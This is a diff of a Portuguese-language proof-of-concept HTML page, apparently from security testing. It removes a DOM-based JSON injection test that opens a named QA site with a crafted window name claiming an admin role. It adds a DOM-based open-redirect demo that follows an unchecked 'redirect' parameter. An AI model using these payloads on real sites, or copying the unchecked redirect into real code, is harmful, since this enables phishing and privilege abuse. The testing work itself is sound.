@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC - DOM-based JSON Injection</title>
+    <title>PoC - DOM-based Open Redirection</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -29,34 +29,23 @@
 </head>
 <body>
     <div class="container">
-        <h1>PoC - DOM-based JSON Injection</h1>
-        <p>Esta página abrirá a aplicação alvo com um nome de janela malicioso para testar a vulnerabilidade de injeção de JSON baseada no DOM.</p>
-        <button onclick="openTarget()">Abrir Aplicação Alvo</button>
+        <h1>PoC - DOM-based Open Redirection</h1>
+        <p>Esta página demonstrará a vulnerabilidade de redirecionamento aberto baseado no DOM.</p>
+        <button onclick="triggerRedirect()">Testar Redirecionamento</button>
         <div id="status" class="status"></div>
     </div>
 
     <script>
-        function openTarget() {
-            // Abrir a aplicação alvo com um nome de janela malicioso
-            const maliciousWindowName = JSON.stringify({
-                user: "attacker",
-                role: "admin",
-                script: "document.querySelector('button').innerText='Hacked!';"
-            });
-            window.open('https://qa.neoway.com.br/apps/', maliciousWindowName);
-            document.getElementById('status').innerHTML = 'Aplicação alvo aberta. Verifique a nova janela para ver se a injeção de JSON foi bem-sucedida.';
-        }
-
-        // Verificar se a injeção de JSON foi bem-sucedida
-        window.onload = function() {
-            try {
-                var data = JSON.parse(window.name);
-                document.getElementById('status').innerHTML = '<p class="success">Injeção de JSON bem-sucedida!</p><p>Dados injetados: ' + JSON.stringify(data) + '</p>';
-            } catch (e) {
-                document.getElementById('status').innerHTML = '<p class="error">Injeção de JSON falhou. Verifique se a aplicação alvo está vulnerável.</p>';
+        function triggerRedirect() {
+            // Simular a leitura de location.search e redirecionar
+            const urlParams = new URLSearchParams(window.location.search);
+            const redirectUrl = urlParams.get('redirect');
+            if (redirectUrl) {
+                window.location.href = redirectUrl;
+            } else {
+                document.getElementById('status').innerHTML = '<p class="error">Parâmetro de redirecionamento não encontrado.</p>';
             }
         }
     </script>
 </body>
 </html>
-
